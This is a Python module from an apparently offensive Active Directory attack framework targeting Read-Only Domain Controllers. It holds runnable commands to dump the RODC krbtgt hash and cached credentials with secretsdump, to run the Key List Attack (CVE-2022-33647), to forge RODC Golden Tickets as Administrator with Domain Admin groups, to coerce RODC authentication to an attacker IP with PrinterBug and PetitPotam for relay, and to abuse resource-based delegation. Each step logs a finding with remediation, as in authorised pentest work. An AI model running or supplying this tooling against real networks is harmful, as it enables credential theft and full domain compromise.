"""
Module: RODC Attacks
Techniques: RODC enumeration, Password Replication Policy (PRP) abuse,
            RODC krbtgt hash dump, Key List Attack (CVE-2022-33647),
            RODC Golden Ticket, cached credential extraction,
            msDS-KrbTgtLink abuse, RODC computer account abuse
"""
from utils.helpers import *
from config.settings import SESSION, get_auth_string, get_cme_auth

# ── RODC attack menu ──────────────────────────────────────────────────────────
MENU = """
  ── ENUMERATION ──────────────────────────────────────────────────────────────
  [1]  Enumerate all RODCs in domain
  [2]  Password Replication Policy — Allowed accounts (msDS-RevealOnDemandGroup)
  [3]  Password Replication Policy — Denied accounts  (msDS-NeverRevealGroup)
  [4]  List accounts CURRENTLY CACHED on RODC        (msDS-RevealedList)
  [5]  Find RODC krbtgt account (msDS-KrbTgtLink)
  [6]  Check RODC computer account privileges

  ── CREDENTIAL EXTRACTION ────────────────────────────────────────────────────
  [7]  Dump RODC krbtgt hash (secretsdump from RODC machine)
  [8]  Key List Attack — extract cached hashes via Kerberos (CVE-2022-33647)
  [9]  Key List Attack — Rubeus variant (Windows side)
  [10] Request cached cred for specific user (nxc / secretsdump)

  ── TICKET FORGING ───────────────────────────────────────────────────────────
  [11] Forge RODC Golden Ticket (impacket-ticketer)
  [12] Forge RODC Golden Ticket (Rubeus — Windows side)
  [13] Check if RODC Golden Ticket → Writable DC escalation is possible

  ── COERCION / RELAY VIA RODC ────────────────────────────────────────────────
  [14] Coerce RODC machine account → relay to Writable DC
  [15] RODC machine account RBCD abuse

  ── AUTO ─────────────────────────────────────────────────────────────────────
  [A]  Full RODC reconnaissance (options 1-6 in sequence)
  [0]  Back
"""


def run():
    print_banner("RODC ATTACKS", "Read-Only Domain Controller Abuse")

    dc      = input_or_session("dc_ip",    "Writable DC IP")
    dom     = input_or_session("domain",   "Domain (e.g. corp.local)")
    user    = input_or_session("username", "Username")
    pw      = input_or_session("password", "Password", secret=True)
    h       = SESSION.get("nt_hash", "")
    base_dn = SESSION.get("base_dn") or ("DC=" + dom.replace(".", ",DC="))

    # Auth strings
    auth_imp = get_auth_string()          # impacket-style
    auth_nxc = get_cme_auth()             # nxc-style
    ldap_b   = (
        f"ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}'"
        f" -b '{base_dn}'"
    )

    # We'll fill these after enumeration
    rodc_ip   = ""
    rodc_name = ""
    krbtgt_id = ""

    section("Target information")
    kv("Writable DC", dc)
    kv("Domain", dom)
    kv("Base DN", base_dn)
    kv("Operator", f"{user}@{dom}")

    print(MENU)
    c = input(f"  {M}Choice{RST}: ").strip().upper()

    # ── [1] Enumerate RODCs ───────────────────────────────────────────────────
    if c in ("1", "A"):
        section("Enumerating RODCs")
        info("Searching for computer accounts with primaryGroupID=521 (RODC)")
        out = run_cmd(
            f"{ldap_b} "
            f"'(&(objectClass=computer)(primaryGroupID=521))' "
            f"cn dNSHostName operatingSystem managedBy msDS-KrbTgtLink "
            f"msDS-RevealOnDemandGroup msDS-NeverRevealGroup",
            capture=True
        )
        if out:
            save_result(out, "rodc_enum.txt", "rodc")
            info("Parsing RODC entries…")
            for line in out.splitlines():
                if line.lower().startswith("dnshostname:"):
                    rodc_fqdn = line.split(":", 1)[1].strip()
                    info(f"RODC found → {NEON_RED}{rodc_fqdn}{RST}")
                if line.lower().startswith("meds-krbtgtlink:") or \
                   line.lower().startswith("msds-krbtgtlink:"):
                    info(f"KrbTgt link → {line.split(':',1)[1].strip()}")
        else:
            warn("No RODCs found — domain may not have RODCs deployed")

    # ── [2] PRP Allowed ───────────────────────────────────────────────────────
    if c in ("2", "A"):
        section("Password Replication Policy — ALLOWED (cached on RODC)")
        out = run_cmd(
            f"{ldap_b} "
            f"'(&(objectClass=computer)(primaryGroupID=521))' "
            f"cn msDS-RevealOnDemandGroup",
            capture=True
        )
        save_result(out, "prp_allowed.txt", "rodc")
        info("Accounts/groups in msDS-RevealOnDemandGroup will have passwords cached on RODC")
        info("If a high-value account is in this list → its hash lives on the RODC")

    # ── [3] PRP Denied ────────────────────────────────────────────────────────
    if c in ("3", "A"):
        section("Password Replication Policy — DENIED")
        out = run_cmd(
            f"{ldap_b} "
            f"'(&(objectClass=computer)(primaryGroupID=521))' "
            f"cn msDS-NeverRevealGroup",
            capture=True
        )
        save_result(out, "prp_denied.txt", "rodc")
        info("Accounts in msDS-NeverRevealGroup are explicitly protected from RODC caching")

    # ── [4] Currently cached on RODC ─────────────────────────────────────────
    if c in ("4", "A"):
        section("Accounts CURRENTLY CACHED on RODC (msDS-RevealedList)")
        rodc_dn = prompt("RODC distinguished name (e.g. CN=RODC01,OU=Domain Controllers,DC=corp,DC=local)")
        if rodc_dn:
            out = run_cmd(
                f"{ldap_b} "
                f"'(distinguishedName={rodc_dn})' "
                f"msDS-RevealedList",
                capture=True
            )
            save_result(out, "rodc_cached_accounts.txt", "rodc")
            cached = [ln.split(":",1)[1].strip()
                      for ln in out.splitlines()
                      if ln.lower().startswith("msds-revealedlist:")]
            if cached:
                success(f"Found {NEON_RED}{len(cached)}{RST} cached credentials on RODC:")
                for acct in cached:
                    arrow(acct, NEON_RED)
                    add_finding(
                        "RODC Cached Credentials",
                        "High",
                        f"Account '{acct}' has password cached on RODC — compromise of RODC exposes this hash",
                        "Audit PRP; remove privileged accounts from Allowed list",
                        evidence=acct,
                    )
            else:
                info("msDS-RevealedList is empty or not readable")

    # ── [5] Find RODC krbtgt account ─────────────────────────────────────────
    if c in ("5", "A"):
        section("RODC krbtgt account (msDS-KrbTgtLink)")
        out = run_cmd(
            f"{ldap_b} "
            f"'(&(objectClass=user)(name=krbtgt_*))' "
            f"cn sAMAccountName distinguishedName msDS-KrbTgtLinkBl",
            capture=True
        )
        save_result(out, "rodc_krbtgt.txt", "rodc")
        for line in out.splitlines():
            if line.lower().startswith("samaccountname:"):
                krbtgt_acct = line.split(":", 1)[1].strip()
                info(f"RODC krbtgt → {NEON_RED}{krbtgt_acct}{RST}")
                info("This account's RC4/AES key is used to sign RODC tickets — dump it to forge Golden Tickets")

    # ── [6] RODC computer account privs ──────────────────────────────────────
    if c in ("6", "A"):
        section("RODC computer account privileges")
        out = run_cmd(
            f"{ldap_b} "
            f"'(&(objectClass=computer)(primaryGroupID=521))' "
            f"cn userAccountControl msDS-AllowedToActOnBehalfOfOtherIdentity "
            f"msDS-AllowedToDelegateTo",
            capture=True
        )
        save_result(out, "rodc_account_privs.txt", "rodc")

    # ── [7] Dump RODC krbtgt hash ─────────────────────────────────────────────
    if c == "7":
        section("Dump RODC krbtgt hash via secretsdump")
        rodc_target = prompt("RODC IP or hostname")
        if rodc_target:
            run_cmd(
                f"{imp('secretsdump.py')} {auth_imp} "
                f"-dc-ip {dc} {rodc_target} "
                f"-just-dc-user 'krbtgt_*'"
            )
            add_finding(
                "RODC krbtgt Hash Dumped",
                "Critical",
                f"RODC-specific krbtgt hash extracted from {rodc_target}",
                "Rotate RODC krbtgt password; restrict physical/RDP access to RODC",
            )

    # ── [8] Key List Attack (impacket / Linux) ────────────────────────────────
    if c == "8":
        section("Key List Attack — extract cached hashes (CVE-2022-33647)")
        info("Requires: RODC krbtgt AES256 key AND rodc ID number")
        info("Attack flow: forge a RODC TGT → send KeyList request → DC returns cached NT hashes")

        rodc_krbtgt_key  = prompt("RODC krbtgt AES256 key (hex, 64 chars)")
        rodc_id          = prompt("RODC krbtgt ID (decimal, found in krbtgt_XXXXX name)")
        rodc_fqdn        = prompt("RODC FQDN (e.g. rodc01.corp.local)")
        target_user      = prompt("Target username to extract (leave blank for ALL cached)")

        if rodc_krbtgt_key and rodc_id and rodc_fqdn:
            if target_user:
                run_cmd(
                    f"{imp('keylistattack.py')} {dom}/{user} "
                    f"-aesKey {rodc_krbtgt_key} "
                    f"-rodcNo {rodc_id} "
                    f"-rodcDomain {dom} "
                    f"-dc-ip {dc} "
                    f"-t '{target_user}'"
                )
            else:
                run_cmd(
                    f"{imp('keylistattack.py')} {dom}/{user} "
                    f"-aesKey {rodc_krbtgt_key} "
                    f"-rodcNo {rodc_id} "
                    f"-rodcDomain {dom} "
                    f"-dc-ip {dc} "
                    f"-full-scan"
                )
            add_finding(
                "Key List Attack (CVE-2022-33647)",
                "Critical",
                f"Extracted cached credential hashes from RODC using Key List Attack",
                "Patch KB5008380 / KB5008602; rotate all cached account passwords; audit PRP",
            )
        else:
            warn("Need rodc_krbtgt_key, rodc_id, and rodc_fqdn to proceed")
            info("Get krbtgt key via: impacket-secretsdump from RODC machine (option 7)")
            info("Get krbtgt ID from: krbtgt_XXXXX account name suffix")

    # ── [9] Key List Attack (Rubeus — Windows) ────────────────────────────────
    if c == "9":
        section("Key List Attack — Rubeus (Windows side)")
        rodc_id    = prompt("RODC number (suffix of krbtgt_XXXXX)")
        aes256     = prompt("RODC krbtgt AES256 key")
        target_usr = prompt("Target user")
        rodc_fqdn  = prompt("RODC FQDN")
        if rodc_id and aes256:
            info("Run on Windows target or via Evil-WinRM:")
            arrow(
                f"Rubeus.exe golden /rodcNumber:{rodc_id} /aes256:{aes256} "
                f"/user:{target_usr} /domain:{dom} /dc:{rodc_fqdn} "
                f"/keyList /nowrap"
            )
            arrow(
                f"Rubeus.exe golden /rodcNumber:{rodc_id} /aes256:{aes256} "
                f"/user:{target_usr} /id:500 /domain:{dom} /dc:{rodc_fqdn} "
                f"/groups:512 /ptt"
            )
            info("The /keyList flag triggers a key list request against the DC using the RODC-signed TGT")

    # ── [10] Request cached cred for specific user ────────────────────────────
    if c == "10":
        section("Request cached credential for specific account")
        rodc_target = prompt("RODC IP or hostname")
        target_user = prompt("Target username (must be in PRP Allowed / currently cached)")
        if rodc_target and target_user:
            run_cmd(
                f"{imp('secretsdump.py')} {auth_imp} "
                f"-dc-ip {dc} {rodc_target} "
                f"-just-dc-user '{dom}\\{target_user}'"
            )

    # ── [11] RODC Golden Ticket (impacket) ────────────────────────────────────
    if c == "11":
        section("Forge RODC Golden Ticket (impacket-ticketer)")
        info("RODC Golden Ticket is valid ONLY for accounts in the PRP Allowed list")
        info("The writable DC will accept it IF the target account is in msDS-RevealOnDemandGroup")

        rodc_krbtgt_hash = prompt("RODC krbtgt NT hash (32 hex chars)")
        rodc_id          = prompt("RODC number (e.g. 23226 from krbtgt_23226)")
        target_user      = prompt("Target username (must be in PRP Allowed)")
        target_spn       = prompt("Target SPN (e.g. cifs/dc01.corp.local)")
        user_id          = prompt("Target user RID (e.g. 500 for Administrator)")

        if rodc_krbtgt_hash and rodc_id and target_user:
            run_cmd(
                f"{imp('ticketer.py')} "
                f"-nthash {rodc_krbtgt_hash} "
                f"-domain-sid $({imp('getPac.py')} {auth_imp} -dc-ip {dc} | grep 'Domain SID' | awk '{{print $NF}}') "
                f"-domain {dom} "
                f"-groups 512,513,518,519,520 "
                f"-user-id {user_id or 500} "
                f"-extra-pac "
                f"-rodc-id {rodc_id} "
                f"{target_user}"
            )
            info("Load ticket: export KRB5CCNAME={target_user}.ccache")
            info(f"Use ticket: impacket-psexec {dom}/{target_user}@{target_spn or dc} -k -no-pass")
            add_finding(
                "RODC Golden Ticket Forged",
                "Critical",
                f"Forged RODC-signed ticket for '{target_user}' using RODC krbtgt hash (rodc-id {rodc_id})",
                "Rotate RODC krbtgt twice; audit PRP Allowed group membership",
            )

    # ── [12] RODC Golden Ticket (Rubeus) ─────────────────────────────────────
    if c == "12":
        section("Forge RODC Golden Ticket (Rubeus — Windows side)")
        rodc_id   = prompt("RODC number")
        rc4       = prompt("RODC krbtgt RC4/NT hash")
        aes256    = prompt("RODC krbtgt AES256 key (optional, preferred)")
        target    = prompt("Target username")
        sid       = prompt("Domain SID (S-1-5-21-...)")
        if rodc_id and (rc4 or aes256) and target and sid:
            key_flag = f"/aes256:{aes256}" if aes256 else f"/rc4:{rc4}"
            info("Run on Windows target:")
            arrow(
                f"Rubeus.exe golden /rodcNumber:{rodc_id} {key_flag} "
                f"/user:{target} /id:500 /domain:{dom} /sid:{sid} "
                f"/groups:512,513,518,519,520 /ptt"
            )

    # ── [13] RODC Golden Ticket → Writable DC escalation check ───────────────
    if c == "13":
        section("RODC Golden Ticket escalation viability check")
        info("A RODC Golden Ticket will be accepted by Writable DC ONLY if:")
        print(f"""
  {NEON_CYN}Condition 1{RST}  Target account is in {BOLD}msDS-RevealOnDemandGroup{RST}  (PRP Allowed)
  {NEON_CYN}Condition 2{RST}  Target account is NOT in {BOLD}msDS-NeverRevealGroup{RST}  (PRP Denied)
  {NEON_CYN}Condition 3{RST}  Writable DC is {BOLD}not fully patched{RST} for CVE-2022-38023 / MS-NRPC hardening
  {NEON_CYN}Condition 4{RST}  The forged ticket uses the correct RODC number in the {BOLD}PAC_ATTRIBUTES{RST}
""")
        info("Enumerate PRP Allowed (option 2) and verify target account is listed")
        run_cmd(
            f"{ldap_b} "
            f"'(&(objectClass=computer)(primaryGroupID=521))' "
            f"cn msDS-RevealOnDemandGroup msDS-NeverRevealGroup msDS-RevealedList",
            capture=True
        )

    # ── [14] Coerce RODC → relay to Writable DC ───────────────────────────────
    if c == "14":
        section("Coerce RODC machine account → relay to Writable DC")
        rodc_target  = prompt("RODC IP")
        attacker_ip  = input_or_session("attacker_ip", "Attacker IP")
        info("Start relay listener:")
        arrow(f"impacket-ntlmrelayx -t ldap://{dc} --delegate-access -smb2support")
        info("Then coerce RODC machine account:")
        arrow(f"impacket-printerbug {dom}/{user}:'{pw}'@{rodc_target} {attacker_ip}")
        arrow(f"python3 tools/PetitPotam/PetitPotam.py {attacker_ip} {rodc_target} -u '{user}' -p '{pw}' -d {dom}")
        info("RODC machine account → RBCD write on Writable DC → S4U2Proxy → DA")
        add_finding(
            "RODC Coercion to Writable DC Relay",
            "High",
            f"RODC machine account coerced to authenticate to attacker, relayed to Writable DC",
            "Enable SMB signing; patch MS-RPRN and MS-EFSR; restrict RODC outbound auth",
        )

    # ── [15] RODC machine account RBCD abuse ─────────────────────────────────
    if c == "15":
        section("RODC machine account RBCD abuse")
        rodc_acct = prompt("RODC machine account name (e.g. RODC01$)")
        comp_acct = prompt("Attacker-controlled computer account (e.g. FAKE01$)")
        comp_pw   = prompt("Computer account password")
        if rodc_acct and comp_acct:
            info("Step 1 — Set msDS-AllowedToActOnBehalfOfOtherIdentity on RODC machine account:")
            run_cmd(
                f"{imp('rbcd.py')} -action write "
                f"-delegate-to '{rodc_acct}' "
                f"-delegate-from '{comp_acct}' "
                f"{auth_imp} -dc-ip {dc}"
            )
            info("Step 2 — S4U2Self + S4U2Proxy for Administrator on RODC:")
            rodc_host = rodc_acct.rstrip("$").lower()
            run_cmd(
                f"{imp('getST.py')} -spn 'cifs/{rodc_host}.{dom}' "
                f"-impersonate Administrator "
                f"{dom}/{comp_acct}:'{comp_pw}' -dc-ip {dc}"
            )

    pause()
